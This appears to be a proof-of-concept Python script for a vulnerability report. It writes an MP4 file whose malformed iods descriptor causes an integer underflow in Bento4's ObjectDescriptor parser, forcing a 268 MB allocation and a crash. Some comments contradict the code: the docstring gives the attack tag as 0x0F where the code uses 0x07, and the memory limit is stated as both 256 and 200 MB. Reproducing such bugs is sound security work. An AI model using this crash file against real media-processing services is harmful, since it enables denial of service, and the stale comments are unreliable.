#!/usr/bin/env python3
"""
PoC generator for VULN-003: AP4_ObjectDescriptor integer underflow → ~4GB SubStream.

Vulnerability: Ap4ObjectDescriptor.cpp (AP4_ObjectDescriptor::AP4_ObjectDescriptor stream ctor)
  Lines ~76-96 (CWE-191 Integer Underflow / Wrap-Around)

Root cause:
  The constructor reads 2 bytes (id_flags) and, when URL_flag is set, reads
  url_length (1B) + url_string (url_length B).  It then computes the sub-stream
  size as:

      substream_size = payload_size - AP4_Size(offset - start)

  With payload_size=2 but actual bytes consumed = 2 + 1 + url_length ≥ 3,
  the unsigned subtraction wraps to ~4 GB (CWE-191 underflow).

Trigger layout (ObjectDescriptor tag=0x01):
  ┌────────────────────────────────────────────────┐
  │ tag=0x01  │ declared_size=0x02                 │  ← expandable descriptor header
  │ id_flags[0]=0x00 │ id_flags[1]=0x20            │  ← 2 bytes of declared payload
  │                                                │    (URL_flag = bit 5 of 0x20)
  │ url_length=0x01  │ url_string=0x41  ← past declared boundary, still read
  │ attack_tag=0x0F  │ 0xFF 0xFF 0xFF 0x7F         │  ← SubStream reads these as
  │                                                │    a ~268 MB descriptor payload
  └────────────────────────────────────────────────┘

Consumed in ctor: 2 (id_flags) + 1 (url_length) + 1 (url_string) = 4 bytes
Underflow: payload_size(2) − 4 = 0xFFFFFFFE  (~4 GB SubStream)

The SubStream immediately encounters the attack bytes [0x0F 0xFF 0xFF 0xFF 0x7F]
which the descriptor factory decodes as tag=0x0F, payload_size=0x0FFFFFFF (268 MB).
AP4_UnknownDescriptor then calls new AP4_Byte[268435455].
With ASAN mmap_limit_mb=256, that 268 MB allocation exceeds the cap → ASAN abort.
"""

import struct
import os

OUT_DIR  = os.path.dirname(os.path.abspath(__file__))
OUT_FILE = os.path.join(OUT_DIR, "vuln_003.mp4")


# ── Generic box helpers ──────────────────────────────────────────────────────

def box(fourcc: str, data: bytes = b"") -> bytes:
    """Return a standard box: 4-byte BE size + 4-byte fourcc + payload."""
    assert len(fourcc) == 4
    size = 4 + 4 + len(data)
    return struct.pack(">I", size) + fourcc.encode("latin-1") + data


def full_box(fourcc: str, version: int, flags: int, data: bytes = b"") -> bytes:
    """Return a FullBox: size + fourcc + version(1B) + flags(3B) + payload."""
    header = struct.pack(">B", version) + struct.pack(">I", flags)[1:]
    return box(fourcc, header + data)


# ── Standard atom builders ────────────────────────────────────────────────────

def build_ftyp() -> bytes:
    data = b"mp42" + struct.pack(">I", 0) + b"mp42" + b"mp41" + b"isom"
    return box("ftyp", data)


def build_mvhd() -> bytes:
    matrix = struct.pack(">9I",
        0x00010000, 0, 0,
        0, 0x00010000, 0,
        0, 0, 0x40000000)
    data = (
        struct.pack(">I", 0) +           # creation_time
        struct.pack(">I", 0) +           # modification_time
        struct.pack(">I", 1000) +        # timescale
        struct.pack(">I", 0) +           # duration
        struct.pack(">I", 0x00010000) +  # rate = 1.0
        struct.pack(">H", 0x0100) +      # volume = 1.0
        b"\x00" * 10 +                   # reserved
        matrix +
        b"\x00" * 24 +                   # pre_defined
        struct.pack(">I", 2)             # next_track_id
    )
    return full_box("mvhd", 0, 0, data)


# ── Malicious iods box ────────────────────────────────────────────────────────

def build_iods_malicious() -> bytes:
    """
    Craft an iods FullBox containing a malformed ObjectDescriptor
    that triggers an integer underflow in AP4_ObjectDescriptor's
    stream-reading constructor.

    Descriptor encoding (MPEG-4 expandable):
      [0x01]        tag = AP4_DESCRIPTOR_TAG_OD (0x01 = ObjectDescriptor)
      [0x02]        declared payload_size = 2 (only 2 bytes of payload declared)
      [0x00][0x20]  id_flags: objectDescriptorID bits + URL_flag set (bit 5 of low byte)
                    ↑ these 2 bytes are the entire declared payload
      [0x01]        url_length = 1  ← read beyond declared boundary
      [0x41]        url_string 'A'  ← read beyond declared boundary
      [0x07]        attack descriptor tag → default case → AP4_UnknownDescriptor
                    (0x07 is NOT in the handled set; 0x0F would be ES_ID_REF and
                    only reads 2 bytes, bypassing the large allocation)
      [0xFF][0xFF][0xFF][0x7F]
                    4-byte expandable size → payload_size = 0x0FFFFFFF (268 MB)
                    SubStream reads these → AP4_UnknownDescriptor tries to
                    allocate 268 MB → crash under ASAN mmap_limit_mb=256

    Offset arithmetic:
      P  = stream position at start of declared payload (the 2 declared bytes)
      P+2: url_length consumed
      P+3: url_string consumed
      P+4: SubStream.m_Offset = here (inside the iods box content)
      SubStream.m_Size = payload_size − (offset−start) = 2 − 4 = 0xFFFFFFFE

    The attack bytes [0x0F 0xFF 0xFF 0xFF 0x7F] sit at P+4 inside the box,
    so the SubStream reads them immediately in its first descriptor factory call.
    """
    # Descriptor header: tag + declared payload_size
    desc_tag         = bytes([0x01])   # AP4_DESCRIPTOR_TAG_OD
    desc_size        = bytes([0x02])   # declared payload = 2 bytes

    # Declared payload (2 bytes): id_flags with URL_flag set (bit 5 of low byte)
    id_flags         = struct.pack(">H", 0x0020)  # URL_flag = 1

    # Extra bytes that the constructor reads PAST the declared boundary
    url_length       = bytes([0x01])   # 1 URL byte follows
    url_string       = bytes([0x41])   # 'A'

    # Attack bytes: tag + 4-byte expandable size = 268 MB
    # Expandable encoding: each byte with bit-7 set contributes lower 7 bits;
    # last byte (no bit-7) ends the sequence.  Max 4 iterations (see factory).
    #   byte1=0xFF → payload_size  = 0x7F,       continue
    #   byte2=0xFF → payload_size  = 0x3FFF,     continue
    #   byte3=0xFF → payload_size  = 0x1FFFFF,   continue
    #   byte4=0x7F → payload_size  = 0x0FFFFFFF, stop
    #
    # IMPORTANT: tag must hit the switch 'default' case (AP4_UnknownDescriptor).
    # Known handled tags: 0x01,0x02,0x03,0x04,0x05,0x06,0x0A,0x0B,0x0E,0x0F,0x10,0x11
    # 0x0F = AP4_DESCRIPTOR_TAG_ES_ID_REF (handled! only reads 2 bytes, no large alloc)
    # Use 0x07 → hits default → AP4_UnknownDescriptor → allocates 268 MB buffer
    attack_tag       = bytes([0x07])
    attack_size      = bytes([0xFF, 0xFF, 0xFF, 0x7F])  # 0x0FFFFFFF = 268,435,455

    descriptor_bytes = (desc_tag + desc_size + id_flags
                        + url_length + url_string
                        + attack_tag + attack_size)

    # iods is a FullBox: version(0) + flags(0) + descriptor
    return full_box("iods", 0, 0, descriptor_bytes)


# ── Minimal trak (required for structural validity) ───────────────────────────

def build_tkhd() -> bytes:
    matrix = struct.pack(">9I",
        0x00010000, 0, 0,
        0, 0x00010000, 0,
        0, 0, 0x40000000)
    data = (
        struct.pack(">I", 0) +       # creation_time
        struct.pack(">I", 0) +       # modification_time
        struct.pack(">I", 1) +       # track_id
        struct.pack(">I", 0) +       # reserved
        struct.pack(">I", 0) +       # duration
        b"\x00" * 8 +
        struct.pack(">H", 0) +       # layer
        struct.pack(">H", 0) +       # alternate_group
        struct.pack(">H", 0x0100) +  # volume
        struct.pack(">H", 0) +       # reserved
        matrix +
        struct.pack(">I", 0) +       # width
        struct.pack(">I", 0)         # height
    )
    return full_box("tkhd", 0, 3, data)


def build_mdhd() -> bytes:
    data = (
        struct.pack(">I", 0) +
        struct.pack(">I", 0) +
        struct.pack(">I", 44100) +
        struct.pack(">I", 0) +
        struct.pack(">H", 0x55C4) +
        struct.pack(">H", 0)
    )
    return full_box("mdhd", 0, 0, data)


def build_hdlr() -> bytes:
    data = struct.pack(">I", 0) + b"soun" + b"\x00" * 12 + b"\x00"
    return full_box("hdlr", 0, 0, data)


def build_smhd() -> bytes:
    return full_box("smhd", 0, 0, struct.pack(">HH", 0, 0))


def build_dref() -> bytes:
    url_entry = full_box("url ", 0, 1, b"")
    return full_box("dref", 0, 0, struct.pack(">I", 1) + url_entry)


def build_dinf() -> bytes:
    return box("dinf", build_dref())


def build_stsd() -> bytes:
    return full_box("stsd", 0, 0, struct.pack(">I", 0))


def build_stts() -> bytes:
    return full_box("stts", 0, 0, struct.pack(">I", 0))


def build_stsz() -> bytes:
    return full_box("stsz", 0, 0, struct.pack(">II", 0, 0))


def build_stbl() -> bytes:
    return box("stbl", build_stsd() + build_stts() + build_stsz())


def build_minf() -> bytes:
    return box("minf", build_smhd() + build_dinf() + build_stbl())


def build_mdia() -> bytes:
    return box("mdia", build_mdhd() + build_hdlr() + build_minf())


def build_trak() -> bytes:
    return box("trak", build_tkhd() + build_mdia())


def build_moov() -> bytes:
    # iods must be a direct child of moov (not inside trak)
    payload = build_mvhd() + build_iods_malicious() + build_trak()
    return box("moov", payload)


def build_mdat() -> bytes:
    return box("mdat", b"")


# ── Main ─────────────────────────────────────────────────────────────────────

def main() -> None:
    mp4 = build_ftyp() + build_moov() + build_mdat()

    with open(OUT_FILE, "wb") as f:
        f.write(mp4)

    iods = build_iods_malicious()
    print(f"[+] Written {len(mp4)} bytes to {OUT_FILE}")
    print(f"[+] iods box size              = {len(iods)} bytes")
    print(f"[+] Descriptor tag             = 0x01 (AP4_DESCRIPTOR_TAG_OD)")
    print(f"[+] Declared descriptor payload= 2 bytes")
    print(f"[+] Actual bytes read by ctor  = 4  (id_flags 2B + url_len 1B + url_str 1B)")
    print(f"[+] Underflow: 2 − 4           = 0xFFFFFFFE  (~4 GB SubStream)")
    print(f"[+] Attack nested descriptor   = tag=0x07 (default→UnknownDescriptor), payload=0x0FFFFFFF (268 MB)")
    print(f"[+] Expected: new AP4_Byte[268435455] under mmap_limit_mb=200 → ASAN abort")


if __name__ == "__main__":
    main()
